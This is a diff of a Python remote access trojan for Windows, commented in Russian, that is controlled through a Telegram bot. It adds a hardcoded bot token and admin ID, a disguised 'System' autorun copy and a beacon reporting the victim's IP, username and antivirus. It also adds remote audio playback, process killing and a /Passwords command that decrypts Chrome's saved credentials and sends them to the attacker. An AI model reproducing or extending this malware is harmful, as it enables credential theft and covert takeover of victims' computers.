@@ -6,30 +6,40 @@ import cv2
 import wave
 import time
 import shutil
+import psutil
 import telebot
+import sqlite3
 import pyaudio
 import requests
 import platform
 import webbrowser
+import win32crypt
+import json,base64
 import urllib.request
 from PIL import ImageGrab
 from telebot import types
 from telebot import util
 from ctypes import *
+from telebot import apihelper
 from ctypes.wintypes import *
-from urllib.error import HTTPError
-from win32gui import GetWindowText, GetForegroundWindow
 from ctypes import cast, POINTER
 from comtypes import CLSCTX_ALL
+from urllib.error import HTTPError
+from win32gui import GetWindowText, GetForegroundWindow
 from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
 
-fname = 'chromx' + os.path.splitext(os.path.basename(sys.argv[0]))[1]
+#Прокси (Если не работает)
+apihelper.proxy = {'http':'http://x.x.x.x:port'}
 
-token = 'Токен'
-adm = 'Айди'
+#Название файла при копировании в автозагрузку
+fname = 'System' + os.path.splitext(os.path.basename(sys.argv[0]))[1]
+
+#Токен/Айди
+token = '1183152381:AAEjS4FUN7BpmzsctCHEg0yPWvqU7WNxGjc'
+adm = '643200553'
 
 bot = telebot.TeleBot(token, threaded=True)
-bot.worker_pool = util.ThreadPool(num_threads=10)
+bot.worker_pool = util.ThreadPool(num_threads=30)
 
 menu = types.ReplyKeyboardMarkup()
 button1 = types.KeyboardButton('/1\n<<')
@@ -189,36 +199,36 @@ if os.path.exists('C:\\Program Files\\Kaspersky Lab'):
    av = 'Kaspersky'
 if os.path.exists('C:\\Program Files\\IObit\\IObit Malware Fighter'):
    av = 'Malware fighter'
-if os.path.exists('C:\\Program Files\\Norton Security'):
-   av = 'Norton'
-if os.path.exists('C:\\Program Files\\Panda Security\\Panda Security Protection'):
-   av = 'Panda Security'
 if os.path.exists('C:\\Program Files\\360\\Total Security'):
    av = '360 Total Security'
 else:
    pass
 
-try:
- r = requests.get('http://ip.42.pl/raw')
- IP = r.text
- bot.send_message(adm, 
- '\n🟢 Online!'
- '\n' + '\nPC » ' + os.getlogin() + 
- '\nOS » ' + platform.system() + ' ' + platform.release() + 
- '\n'
- '\nAV » ' + av +
- '\n'
- '\nIP » ' + IP,
- reply_markup=menu)
- if os.path.exists('C:\\ProgramData\\Files'):
+while True:
+ try:
+  r = requests.get('http://ip.42.pl/raw')
+  IP = r.text
+  bot.send_message(adm, 
+  '\n🟢 Online!'
+  '\n' + '\nPC » ' + os.getlogin() + 
+  '\nOS » ' + platform.system() + ' ' + platform.release() + 
+  '\n'
+  '\nAV » ' + av +
+  '\n'
+  '\nIP » ' + IP,
+  reply_markup=menu)
+  if os.path.exists('C:\\ProgramData\\Files'):
+    pass
+  else:
+    os.makedirs('C:\\ProgramData\\Files')
+    os.makedirs('C:\\ProgramData\\Files\\Documents')
+    os.makedirs('C:\\ProgramData\\Files\\Photos')
+    os.makedirs('C:\\ProgramData\\Files\\Music')
+    os.makedirs('C:\\ProgramData\\Files\\Voice')
+ except:
    pass
  else:
-   os.makedirs('C:\\ProgramData\\Files')
-   os.makedirs('C:\\ProgramData\\Files\\Documents')
-   os.makedirs('C:\\ProgramData\\Files\\Photos')
-except:
- time.sleep(60)
- os.startfile(sys.argv[0])
+   break
 
 @bot.message_handler(commands=['Start', 'start', 'Help', 'help'])
 def help(command):
@@ -235,12 +245,12 @@ def help(command):
   '\n/AutoRun - Автозагрузка'
   '\n'
   '\n/Files - Файловый менеджер'
-  '\n> /CD - Текущая директория'
-  '\n> /Pwd - Просмотр содержимого'
-  '\n> /Delete - Удалить файл'
-  '\n> /Upload - Загрузить файл'
-  '\n> /Download - Скачать файл'
-  '\n> /Run - Запустить файл'
+  '\n› /CD - Текущая директория'
+  '\n› /Pwd - Просмотр содержимого'
+  '\n› /Delete - Удалить файл'
+  '\n› /Upload - Загрузить файл'
+  '\n› /Download - Скачать файл'
+  '\n› /Run - Запустить файл'
   '\n/Tasklist - Список процессов'
   '\n/Taskkill - Остановить процесс'
   '\n'
@@ -250,7 +260,9 @@ def help(command):
   '\n/Wallpapers - Установить обои'
   '\n/OpenEXE - Запуск программ'
   '\n'
-  '\n '
+  '\n/Passwords - Получить пароли'
+  '\n'
+  '\n'
   '\n_Coded by Bainky_ | *@bainki* 👾', 
   reply_markup=menu, parse_mode="Markdown")
 
@@ -258,12 +270,10 @@ def help(command):
 def main(command):
  bot.send_chat_action(command.chat.id, 'typing')
  bot.send_message(command.chat.id, '`...`', reply_markup=menu, parse_mode="Markdown")
-
 @bot.message_handler(commands=['2', '5'])
 def main(command):
  bot.send_chat_action(command.chat.id, 'typing')
  bot.send_message(command.chat.id, '`...`', reply_markup=main6, parse_mode="Markdown")
-
 @bot.message_handler(commands=['4', '1'])
 def main(command):
  bot.send_chat_action(command.chat.id, 'typing')
@@ -545,6 +555,7 @@ def callback_inline(call):
       file = os.path.basename(sys.argv[0])
       if os.path.exists(path + fname):
         bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*' + fname + '* уже находится в автозагрузке!', parse_mode="Markdown")
+        os.startfile(path + fname)
       else:
         shutil.copy2((sys.argv[0]), r'' + path)
         bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*' + file + '* скопирован в автозагрузку!', parse_mode="Markdown")
@@ -569,7 +580,7 @@ def callback_inline(call):
       bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*' + os.path.basename(sys.argv[0]) + '* удален!', parse_mode="Markdown")
       directory = 'C:\\ProgramData\\'
       with open(os.path.join(directory, 'uninstaller.bat'), 'w') as OPATH:
-        OPATH.writelines(['taskkill /F /IM ' + os.path.basename(sys.argv[0]) + '\n', 
+        OPATH.writelines(['taskkill /f /im "' + os.path.basename(sys.argv[0]) + '"\n', 
                           'timeout 1\n', 
                           'del /s /q "', sys.argv[0]])
       os.startfile('C:\\ProgramData\\uninstaller.bat')
@@ -582,7 +593,7 @@ def callback_inline(call):
       directory = 'C:\\ProgramData\\'
       with open(os.path.join(directory, 'taskkill.bat'), 'w') as OPATH:
           OPATH.writelines(['if "%~1"=="" (set "x=%~f0"& start "" /min "%comspec%" /v/c "!x!" any_word & exit /b)\n', 
-                            'taskkill /f /fi "USERNAME eq %username%" /fi "IMAGENAME ne explorer.exe USERNAME eq %username%" /fi "IMAGENAME ne ' + os.path.basename(sys.argv[0])])
+                            'taskkill /f /fi "USERNAME eq %username%" /fi "IMAGENAME ne explorer.exe USERNAME eq %username%" /fi "IMAGENAME ne "' + os.path.basename(sys.argv[0]) + '"'])
       os.startfile('C:\\ProgramData\\taskkill.bat')
       bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*Все процессы остановлены!*', parse_mode="Markdown")
     except:
@@ -952,12 +963,10 @@ def cancelfiles(command):
 @bot.message_handler(commands=['Tasklist', 'tasklist'])
 def tasklist(command):
  try:
-  bot.send_chat_action(command.chat.id, 'upload_document')
-  os.system('tasklist>  C:\\ProgramData\\Tasklist.txt')
-  tasklist = open('C:\\ProgramData\\Tasklist.txt')
-  bot.send_document(command.chat.id, tasklist)
-  tasklist.close()
-  os.remove('C:\\ProgramData\\Tasklist.txt')
+  bot.send_chat_action(command.chat.id, 'typing')
+  procs = [proc.name().replace('.exe', '') for proc in psutil.process_iter()]
+  sprocs = '\n'.join(procs)
+  bot.send_message(command.chat.id, '`' + sprocs + '`', parse_mode="Markdown")
  except:
   pass
 
@@ -1069,8 +1078,191 @@ def say(message):
  except:
   pass
 
+@bot.message_handler(content_types=['voice'])
+def voiceloader(message):
+ try:
+  file_info = bot.get_file(message.voice.file_id)
+  bot.reply_to(message, '*Воспроизводим...*', parse_mode="Markdown")
+  downloaded_file = bot.download_file(file_info.file_path)
+  src='C:\\ProgramData\\Files\\'+file_info.file_path;
+  with open(src, 'wb') as new_file:
+   new_file.write(downloaded_file)
+  os.startfile('C:\\ProgramData\\Files\\'+file_info.file_path)
+  devices = AudioUtilities.GetSpeakers()
+  interface = devices.Activate(
+      IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
+  volume = cast(interface, POINTER(IAudioEndpointVolume))
+  volume.SetMasterVolumeLevel(-0.0, None)
+  bot.send_message(message.chat.id, '*Готово!*', parse_mode="Markdown")
+  del speaker
+ except:
+  pass
+
+@bot.message_handler(content_types=['audio'])
+def audiospeaker(message):
+ try:
+  file_info = bot.get_file(message.audio.file_id)
+  bot.reply_to(message, '*Воспроизводим...*', parse_mode="Markdown")
+  downloaded_file = bot.download_file(file_info.file_path)
+  src='C:\\ProgramData\\Files\\'+file_info.file_path;
+  with open(src, 'wb') as new_file:
+   new_file.write(downloaded_file)
+  os.startfile('C:\\ProgramData\\Files\\'+file_info.file_path)
+  devices = AudioUtilities.GetSpeakers()
+  interface = devices.Activate(
+      IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
+  volume = cast(interface, POINTER(IAudioEndpointVolume))
+  volume.SetMasterVolumeLevel(-0.0, None)
+  bot.send_message(message.chat.id, '*Готово!*', parse_mode="Markdown")
+  del speaker
+ except:
+  pass
+
+@bot.message_handler(commands=['Passwords', 'passwords'])
+def passwords(command):
+ try:
+  bot.send_chat_action(command.chat.id, 'typing')
+  from cryptography.hazmat.backends import default_backend
+  from cryptography.hazmat.primitives.ciphers import (
+      Cipher, algorithms, modes)
+
+  NONCE_BYTE_SIZE = 12
+
+  def encrypt(cipher, plaintext, nonce):
+      cipher.mode = modes.GCM(nonce)
+      encryptor = cipher.encryptor()
+      ciphertext = encryptor.update(plaintext)
+      return (cipher, ciphertext, nonce)
+
+  def decrypt(cipher, ciphertext, nonce):
+      cipher.mode = modes.GCM(nonce)
+      decryptor = cipher.decryptor()
+      return decryptor.update(ciphertext)
+
+  def get_cipher(key):
+      cipher = Cipher(
+          algorithms.AES(key),
+          None,
+          backend=default_backend()
+      )
+      return cipher
+
+  APP_DATA_PATH= os.environ['LOCALAPPDATA']
+  DB_PATH = r'Google\Chrome\User Data\Default\Login Data'
+
+  def dpapi_decrypt(encrypted):
+      class DATA_BLOB(ctypes.Structure):
+          _fields_ = [('cbData', ctypes.wintypes.DWORD),
+                      ('pbData', ctypes.POINTER(ctypes.c_char))]
+
+      p = ctypes.create_string_buffer(encrypted, len(encrypted))
+      blobin = DATA_BLOB(ctypes.sizeof(p), p)
+      blobout = DATA_BLOB()
+      retval = ctypes.windll.crypt32.CryptUnprotectData(
+          ctypes.byref(blobin), None, None, None, None, 0, ctypes.byref(blobout))
+      if not retval:
+          raise ctypes.WinError()
+      result = ctypes.string_at(blobout.pbData, blobout.cbData)
+      ctypes.windll.kernel32.LocalFree(blobout.pbData)
+      return result
+
+  def unix_decrypt(encrypted):
+      if sys.platform.startswith('linux'):
+          password = 'peanuts'
+          iterations = 1
+      else:
+          raise NotImplementedError
+
+      from Crypto.Cipher import AES
+      from Crypto.Protocol.KDF import PBKDF2
+
+      salt = 'saltysalt'
+      iv = ' ' * 16
+      length = 16
+      key = PBKDF2(password, salt, length, iterations)
+      cipher = AES.new(key, AES.MODE_CBC, IV=iv)
+      decrypted = cipher.decrypt(encrypted[3:])
+      return decrypted[:-ord(decrypted[-1])]
+
+  def get_key_from_local_state():
+      jsn = None
+      with open(os.path.join(os.environ['LOCALAPPDATA'],
+          r"Google\Chrome\User Data\Local State"),encoding='utf-8',mode ="r") as f:
+          jsn = json.loads(str(f.readline()))
+      return jsn["os_crypt"]["encrypted_key"]
+
+  def aes_decrypt(encrypted_txt):
+      encoded_key = get_key_from_local_state()
+      encrypted_key = base64.b64decode(encoded_key.encode())
+      encrypted_key = encrypted_key[5:]
+      key = dpapi_decrypt(encrypted_key)
+      nonce = encrypted_txt[3:15]
+      cipher = get_cipher(key)
+      return decrypt(cipher,encrypted_txt[15:],nonce)
+
+  class ChromePassword:
+      def __init__(self):
+          self.passwordList = []
+
+      def get_chrome_db(self):
+          _full_path = os.path.join(APP_DATA_PATH,DB_PATH)
+          _temp_path = os.path.join(APP_DATA_PATH,'sqlite_file')
+          if os.path.exists(_temp_path):
+              os.remove(_temp_path)
+          shutil.copyfile(_full_path,_temp_path)
+          self.show_password(_temp_path)
+
+      def show_password(self,db_file):
+          conn = sqlite3.connect(db_file)
+          _sql = 'select signon_realm,username_value,password_value from logins'
+          for row in conn.execute(_sql):
+              host = row[0]
+              if host.startswith('android'):
+                  continue
+              name = row[1]
+              value = self.chrome_decrypt(row[2])
+              _info = 'Hostname: %s\nUsername: %s\nPassword: %s\n\n' %(host,name,value)
+              self.passwordList.append(_info)
+          conn.close()
+          os.remove(db_file)
+
+      def chrome_decrypt(self,encrypted_txt):
+          if sys.platform == 'win32':
+              try:
+                  if encrypted_txt[:4] == b'\x01\x00\x00\x00':
+                      decrypted_txt = dpapi_decrypt(encrypted_txt)
+                      return decrypted_txt.decode()
+                  elif encrypted_txt[:3] == b'v10':
+                      decrypted_txt = aes_decrypt(encrypted_txt)
+                      return decrypted_txt[:-16].decode()
+              except WindowsError:
+                  return None
+          else:
+              try:
+                  return unix_decrypt(encrypted_txt)
+              except NotImplementedError:
+                  return None
+
+      def save_passwords(self):
+          with open('C:\\ProgramData\\Passwords.txt','w',encoding='utf-8') as f:
+              f.writelines(self.passwordList)
+
+  if __name__=="__main__":
+      Main = ChromePassword()
+      Main.get_chrome_db()
+      Main.save_passwords()
+      try:
+       passwords = open('C:\\ProgramData\\Passwords.txt')
+       bot.send_document(command.chat.id, passwords)
+       passwords.close()
+       os.remove('C:\\ProgramData\\Passwords.txt')
+      except:
+       pass
+ except:
+ 	bot.send_message(command.chat.id, '*Паролей не найдено*', parse_mode="Markdown")
+
 try:
   bot.polling(none_stop=True)
 except:
-  os.startfile(os.startfile(sys.argv[0]))
+  os.startfile(sys.argv[0])
   sys.exit()
